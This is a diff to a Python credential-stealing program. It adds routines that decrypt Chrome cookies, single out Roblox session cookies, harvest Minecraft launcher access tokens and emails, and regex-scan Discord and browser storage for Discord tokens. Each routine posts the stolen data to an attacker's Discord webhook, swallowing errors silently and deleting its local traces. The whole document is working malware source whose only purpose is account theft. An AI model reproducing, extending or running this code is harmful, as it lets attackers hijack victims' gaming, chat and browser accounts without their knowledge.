@@ -4,6 +4,8 @@ from base64 import b64decode
 from win32crypt import CryptUnprotectData
 from subprocess import PIPE, Popen
 from pyfiglet import Figlet
+from tempfile import mkdtemp, gettempdir
+from Crypto.Cipher import AES
 nom_utilisateur = os.getlogin()
 nom_pc = os.getenv("COMPUTERNAME")
 
@@ -11,6 +13,8 @@ def ascii_art(fonts, text):
 
   custom_fig = Figlet(font=fonts)
   return custom_fig.renderText(text)
+
+
 
 
 def initialize():
@@ -25,9 +29,19 @@ def initialize():
   except:
     pass
   try:
+    tken()
+  except:
+    pass
+  try:
+    minecraft()
+  except:
+    pass
+  
+  try:
     cookie_stl()
   except:
     pass
+  
   try:
     os.remove(f"./cookie_{nom_utilisateur}.txt")
   except:
@@ -36,6 +50,7 @@ def initialize():
     os.remove(f"./pswd_{nom_utilisateur}.txt")
   except:
     pass
+  
   
 def pc_info():
   global notrewebhook
@@ -72,13 +87,30 @@ def decrypt_val(buff, master_key) -> str:
             decrypted_pass = cipher.decrypt(payload)
             decrypted_pass = decrypted_pass[:-16].decode()
             return decrypted_pass
-        except Exception:
-            return f'Failed to decrypt "{str(buff)}" | key: "{str(master_key)}"'
+        except Exception as e:
+            return f'Failed to decrypt "{str(buff)}" | key: "{str(master_key)}\nException: {e}"'
 def cookie_stl():
-  global list_cookie, notrewebhook
+  global list_cookie, robloxcookies, notrewebhook
   list_cookie = []
+  robloxcookies = []
   cookie_firefox()
-  lc = "\n".join(list_cookie)
+  grabCookies()
+  list_cookie.extend(robloxcookies)
+  lc = "".join(list_cookie)
+  robloxcookies = "\n".join(robloxcookies)
+
+  if len(robloxcookies) < 4:
+    robloxembed = {
+      "description": f"```no roblox avaible``` :(",
+      "title": f":red_car:  - `roblox from *{nom_utilisateur}*`"
+    }
+  else:
+    robloxembed = {
+      "description": f"roblox:\n {robloxcookies}```",
+      "title": f":red_car:  - `roblox from *{nom_utilisateur}*`"
+    }
+
+  result = requests.post(notrewebhook, json={"embeds": [robloxembed]} )
   embed = {
       "description": f"cooooki3 steeeelllzaaadd:\n {lc}```",
       "title": f":cook: - `ckie from *{nom_utilisateur}*`"
@@ -99,6 +131,11 @@ def cookie_stl():
     r = requests.post(notrewebhook, json={"embeds": [nembed]}, files=files)
   else:
     pass
+
+  
+  
+  
+
   #print("COOOKUIIIIEI")
   
 def password_nav():
@@ -125,7 +162,6 @@ def password_nav():
       'file': ('./pswd_{nom_utilisateur}.txt', open('./pwd_{nom_utilisateur}.txt', 'rb')),
     }
     r = requests.post(notrewebhook, json={"embeds": [nembed]}, files=files)
-    
 
 def decrypt_browser(LocalState, LoginData, CookiesFile, name):
     global list_pass, list_cookie
@@ -326,6 +362,7 @@ def pswd_chrome():
 
 def cookie_firefox():
   global list_cookie
+
   if sys.platform == "win32" or sys.platform == "cygwin":
       path = os.path.join(os.path.expanduser("~"), "AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
   elif sys.platform == "darwin":
@@ -342,10 +379,11 @@ def cookie_firefox():
   c = conn.cursor()
   c.execute("SELECT * FROM moz_cookies")
   for result in c.fetchall():
+      host = result[4]
+      user = result[2]
+      if host != "":
+        list_cookie.append(f"HOST KEY: {host} | NAME: {user} | VALUE: {result[3]}\n")
       
-      result = "".join(str(result))
-      list_cookie.append(result)
-
   conn.close()
 
 def cookie_another():
@@ -360,3 +398,142 @@ def cookie_another():
     }
     for name, path in browser_loc.items():
         decrypt_files_cookie(path, name)
+
+def getLocationsMC():
+    if os.name == 'nt':
+        locations = [
+            f'{os.getenv("APPDATA")}\\.minecraft\\launcher_accounts.json',
+            f'{os.getenv("APPDATA")}\\Local\Packages\\Microsoft.MinecraftUWP_8wekyb3d8bbwe\\LocalState\\games\\com.mojang\\'
+        ]
+        return locations
+    else:
+        locations = [
+            f"\\home\\{os.path.split(os.path.expanduser('~'))[-1]}\\.minecraft\\launcher_accounts.json",
+            f'\\sdcard\\games\\com.mojang\\',
+            f'\\~\\Library\\Application Support\\minecraft'
+            f'Apps\\com.mojang.minecraftpe\\Documents\\games\\com.mojang\\'
+        ]
+        return locations
+
+def minecraft():
+  global notrewebhook
+  accounts = []
+  totalaccount = 0
+  numaccount = 0
+  for location in getLocationsMC():
+        if os.path.exists(location):
+            auth_db = json.loads(open(location).read())['accounts']
+
+            for d in auth_db:
+                sessionKey = auth_db[d].get('accessToken')
+                username = auth_db[d].get('minecraftProfile')['name']
+                sessionType = auth_db[d].get('type')
+                email = auth_db[d].get('username')
+                if sessionKey != None or '':
+                    totalaccount = totalaccount + 1
+                    accounts.append([username, sessionType, email, sessionKey])
+  for account in accounts:
+        numaccount = numaccount + 1
+        if '@' in account[2]:
+            name = 'Email Address'
+        else:
+            name = 'Xbox Username'
+            
+        if account[3] == None or " ":
+          sessiontype = "NONE(no find)"
+        else:
+          sessiontype = account[3]
+
+
+        embed = {
+          "title": ":pick: - `account minecraft of *3361*`",
+          "fields": [
+            {"name": f"{name}","value": f"`{account[2]}`"},
+            {"name": "Username","value": f"`{account[0]}`"},
+            {"name": "Session Type","value": f"`{account[1]}`"},
+            {"name": "Session Authorization","value": f"`{sessiontype}`"}
+          ],
+          "footer": {"text": f"{numaccount}/{totalaccount}"}
+        }
+        result = requests.post(notrewebhook, json={"embeds": [embed]})
+
+
+
+def grabCookies():
+        global robloxcookies, list_cookie
+        appdata = os.getenv('LOCALAPPDATA')
+        chrome_user_data = ntpath.join(appdata, 'Google', 'Chrome', 'User Data')
+        chrome_reg = re.compile(r'(^profile\s\d*)|default|(guest profile$)', re.IGNORECASE | re.MULTILINE)
+        chrome_key = laclestpbg_chrome(ntpath.join(chrome_user_data, "Local State"))
+        dire = mkdtemp(), gettempdir()
+        
+        for prof in os.listdir(chrome_user_data):
+            if re.match(chrome_reg, prof):
+                login_db = ntpath.join(chrome_user_data, prof, 'Network', 'cookies')
+                conn = sqlite3.connect(login_db)
+                cursor = conn.cursor()
+                cursor.execute("SELECT host_key, name, encrypted_value from cookies")
+
+                for r in cursor.fetchall():
+                    host = r[0]
+                    user = r[1]
+                    decrypted_cookie = decrypt_val(r[2], chrome_key)
+                    if host != "":
+                        list_cookie.append(f"HOST KEY: {host} | NAME: {user} | VALUE: {decrypted_cookie}\n")
+                    if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in decrypted_cookie:
+                        robloxcookies.append(decrypted_cookie)
+
+                cursor.close()
+                conn.close()
+
+
+
+def find_tokens(path):
+    path += '\\Local Storage\\leveldb'
+
+    tokens = []
+
+    for file_name in os.listdir(path):
+        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+            continue
+
+        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                for token in re.findall(regex, line):
+                    tokens.append(token)
+    return tokens
+
+def tken():
+    list_tken = []
+    local = os.getenv('LOCALAPPDATA')
+    roaming = os.getenv('APPDATA')
+
+    paths = {
+        'Discord': roaming + '\\Discord',
+        'Discord Canary': roaming + '\\discordcanary',
+        'Discord PTB': roaming + '\\discordptb',
+        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
+        'Opera': roaming + '\\Opera Software\\Opera Stable',
+        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
+    }
+    message = ""
+    for platform, path in paths.items():
+          if not os.path.exists(path):
+            continue
+          tokens = find_tokens(path)
+          
+          if len(tokens) > 0:
+            for token in tokens:
+                message = message + f"{platform}: ```{token}```\n" 
+          else:
+            message = message + f'No tkens found on {platform}.\n' 
+      
+
+    embed = {
+          "description": message,
+          "title": f":coin:` - tkn of  *{nom_utilisateur}*`",
+    }
+    result = requests.post(notrewebhook, json={"embeds": [embed]}) 
+    
+    
